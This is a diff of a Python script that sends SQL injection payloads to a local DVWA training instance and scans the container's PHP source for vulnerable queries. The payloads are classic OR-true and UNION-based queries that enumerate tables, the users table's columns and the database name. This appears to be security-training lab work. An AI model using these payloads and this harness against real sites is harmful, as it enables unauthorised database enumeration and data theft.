@@ -1,30 +1,29 @@
 import requests
 import subprocess
 import re
+from bs4 import BeautifulSoup
 
-# Adjust the URL to point to the correct DVWA path
-url = ''  # Ensure this URL is correct
+# Adjust the URLs to point to the correct DVWA paths
+urls = {
+    'sqli': 'http://127.0.0.1/vulnerabilities/sqli/',
+}
 cookies = {
-    'PHPSESSID': '',  # Replace with your actual session cookie
-    'security': 'low'  # Ensure this matches the security level set in DVWA
+    'PHPSESSID': '2vel43slr3e634clddgoe44jt5',  # Replace with your actual session cookie
+    'security': 'low'  # Change security level here (low, medium, high)
 }
 
-# Validate URL and cookies
-if not url or not cookies.get('PHPSESSID'):
-    print("Error: URL or cookies are not properly set.")
-    exit(1)
-
-# List of refined payloads to test different types of SQL Injection
+# Payloads to test
 payloads = {
-     "Classic ' OR '1'='1'/*": "' OR '1'='1'/*",
-    "Union-based": "' UNION SELECT NULL, NULL, NULL-- ",
-    "Error-based": "' AND 1=CONVERT(int, (SELECT @@version))-- ",
-    "Boolean-based Blind": " AND '1'='1'/* ",
-    "Time-based Blind": "' AND SLEEP(5)/*"
+    "Classic SQL Injection": "' OR '1'='1'-- ",
+    "Union-based - Tables": "' UNION SELECT table_name, NULL FROM information_schema.tables -- ",
+    "Union-based - Users": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- ",
+    "Union-based - Database": "' UNION SELECT null, database()-- "  # Added payload
 }
 
-def submit_payload(payload_name, payload):
-    """Submit payloads to the web application and display results."""
+def submit_payload(url, payload_name, payload):
+    """Submit payloads to the web application and print the results."""
+    print(f"Target URL: {url}")  # Print the target URL
+
     data = {
         'id': payload,
         'Submit': 'Submit'
@@ -32,24 +31,75 @@ def submit_payload(payload_name, payload):
 
     try:
         response = requests.post(url, cookies=cookies, data=data, timeout=10)
+        response.raise_for_status()
 
-        # Check for specific content that indicates SQL injection success
-        if response.status_code == 200:
-            if any(phrase in response.text.lower() for phrase in [
-                'the used select statements have a different number of columns',
-                'you have an error in your sql syntax',
-                'user id exists in the database',
-                'error']):
-                print(f"SQL Injection successful with {payload_name}: {payload}")
-            else:
-                print(f"SQL Injection unsuccessful with {payload_name}: {payload}")
+        # Use BeautifulSoup to parse the HTML content
+        soup = BeautifulSoup(response.text, 'html.parser')
+        injected_content = soup.get_text()
+
+        # Fetch the original content for comparison
+        original_response = requests.get(url, cookies=cookies, timeout=10)
+        original_content = BeautifulSoup(original_response.text, 'html.parser').get_text()
+
+        # Determine if the response changed
+        if original_content != injected_content:
+            print(f"Possible SQL Injection successful with {payload_name}: {payload}")
+            analyze_content_changes(original_content, injected_content)
         else:
-            print(f"Unexpected status code {response.status_code} with {payload_name}: {payload}")
+            print(f"Payload {payload_name} was unsuccessful.")
 
+        # Extract relevant part of the injected content
+        relevant_content = extract_relevant_content(original_content, injected_content)
+        
+        # Print the data from the response
+        print(f"\n--- Results for Payload: {payload_name} ---")
+        print(f"Payload Used: {payload}\n")
+        print("Relevant Injected Content:\n")
+        print(relevant_content)
         print("-" * 50)
 
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
+
+def analyze_content_changes(original_content, injected_content):
+    """Analyze changes in content to detect potential SQL Injection success."""
+    # Example patterns to look for
+    patterns = [
+        re.compile(r"users?", re.IGNORECASE),  # Detect changes related to user information
+        re.compile(r"table names?", re.IGNORECASE),  # Detect changes related to table names
+        re.compile(r"sql injection", re.IGNORECASE),  # General term to see if the page displays injection-related info
+        re.compile(r"database", re.IGNORECASE)  # Detect database name changes
+    ]
+    
+    for pattern in patterns:
+        if pattern.search(injected_content):
+            print("Detected specific content changes that might indicate SQL Injection.")
+            return
+    
+    # Check for significant content differences
+    if len(injected_content) > len(original_content) and injected_content.count('<') > 10:
+        print("Content size increased significantly, might indicate successful SQL Injection.")
+
+def extract_relevant_content(original_content, injected_content):
+    """Extract relevant content from the injected content."""
+    # Define patterns to extract content related to SQL Injection results
+    start_patterns = [
+        re.compile(r"ID: ' OR '1'='1'--", re.IGNORECASE),
+        re.compile(r"table_name", re.IGNORECASE),
+        re.compile(r"column_name", re.IGNORECASE),
+        re.compile(r"database", re.IGNORECASE)  # Added pattern for database results
+    ]
+    
+    for start_pattern in start_patterns:
+        start_match = start_pattern.search(injected_content)
+        if start_match:
+            start_index = start_match.end()
+            end_index = injected_content.find("More Information", start_index)
+            if end_index == -1:
+                end_index = None
+            return injected_content[start_index:end_index].strip()
+    
+    return "No relevant content found."
 
 def get_container_id():
     """Retrieve the container ID for the running DVWA container."""
@@ -66,6 +116,25 @@ def get_container_id():
     except Exception as e:
         print(f"Error retrieving container ID: {e}")
         return None
+
+def list_php_files(directory):
+    """List all PHP files in a given directory inside the Docker container."""
+    try:
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return []
+
+        result = subprocess.run(
+            ["docker", "exec", container_id, "find", directory, "-type", "f", "-name", "*.php"],
+            capture_output=True,
+            text=True
+        )
+        files = result.stdout.strip().split('\n')
+        return files
+    except Exception as e:
+        print(f"Error listing PHP files: {e}")
+        return []
 
 def fetch_php_code(file_path):
     """Fetch and return the PHP code from the Docker container."""
@@ -89,56 +158,59 @@ def extract_vulnerable_code(php_code):
     """Extract and return all lines containing vulnerable code snippets."""
     lines = php_code.splitlines()
     vulnerable_lines = []
-    
+
     # Regular expression patterns to identify common SQL injection vulnerabilities
     patterns = [
         re.compile(r"\$query\s*=\s*\"SELECT.*FROM.*WHERE.*'\$id';\";", re.MULTILINE),
         re.compile(r"\$query\s*=\s*\"SELECT.*FROM.*WHERE.*$id;\";", re.MULTILINE),
-        re.compile(r"mysqli_query\s*\(\s*\$GLOBALS\[\"___mysqli_ston\"\],\s*\$query\s*\)", re.MULTILINE),
-        re.compile(r"SQLite3::query\s*\(\s*\$query\s*\)", re.MULTILINE),
+        re.compile(r"\$query\s*=\s*\"SELECT.*FROM.*WHERE.*'?\$id'?;\";", re.MULTILINE),
     ]
-    
+
     for line in lines:
         if any(pattern.search(line) for pattern in patterns):
             vulnerable_lines.append(line)
-    
+
     return vulnerable_lines
 
 def main():
-    # Check if URL and cookies are valid
-    if not url or not cookies.get('PHPSESSID'):
-        print("Error: URL or cookies are not properly set.")
-        return
-
-    # Print the security level at the top
+    # Print the security level and target URLs at the top
     print(f"Security Level: {cookies.get('security')}\n")
-    
-    # Loop through each payload and test SQL injection
-    for name, payload in payloads.items():
-        print(f"Testing payload: {name}")
-        print(f"Payload used: {payload}")
-        submit_payload(name, payload)
 
-    # Fetch and display the PHP code from low.php
-    low_php_path = '/var/www/html/vulnerabilities/sqli/source/low.php'
-    php_code = fetch_php_code(low_php_path)
-    
-    if not php_code:
-        print("Error: Unable to fetch PHP code.")
+    # Test all payloads for SQL Injection on the `sqli` endpoint
+    for payload_name, payload in payloads.items():
+        print(f"\n--- Testing Payload: {payload_name} ---")
+        print(f"Payload used: {payload}")
+        submit_payload(urls['sqli'], payload_name, payload)
+
+    # List and process all PHP files in the vulnerabilities directory
+    php_files = list_php_files('/var/www/html/vulnerabilities/sqli/source/')
+    if not php_files:
+        print("No PHP files found.")
         return
 
-    print("Vulnerable File: /var/www/html/vulnerabilities/sqli/source/low.php")
-    print("--- Vulnerable PHP Code Snippets ---\n")
-    vulnerable_lines = extract_vulnerable_code(php_code)
-    if vulnerable_lines:
-        for line in vulnerable_lines:
-            print(line)
-    else:
-        print("No specific vulnerable code snippets found.")
-    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
-    
+    print("Checking the following PHP files for vulnerabilities:")
+    for php_file in php_files:
+        print(f"Processing file: {php_file}")
+        php_code = fetch_php_code(php_file)
+        if php_code:
+            vulnerable_lines = extract_vulnerable_code(php_code)
+            if vulnerable_lines:
+                print(f"\nVulnerable File: {php_file}")
+                print("--- Vulnerable PHP Code Snippets ---\n")
+                for line in vulnerable_lines:
+                    print(line)
+                print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+            else:
+                print(f"No specific vulnerable code snippets found in {php_file}.")
+        else:
+            print(f"Error: Unable to fetch PHP code from {php_file}.")
+
     # Add more details about the vulnerability
-    print("The code above is vulnerable because it directly embeds user input into the SQL query without proper escaping or validation. An attacker can manipulate this input to execute arbitrary SQL commands.")
+    print("The code is vulnerable because it directly uses user input in SQL queries without proper validation or escaping, allowing attackers to inject malicious SQL code.")
     
+    # Add double lines at the end of the output
+    print("\n" + "-" * 50)
+    print("-" * 50)
+
 if __name__ == "__main__":
     main()
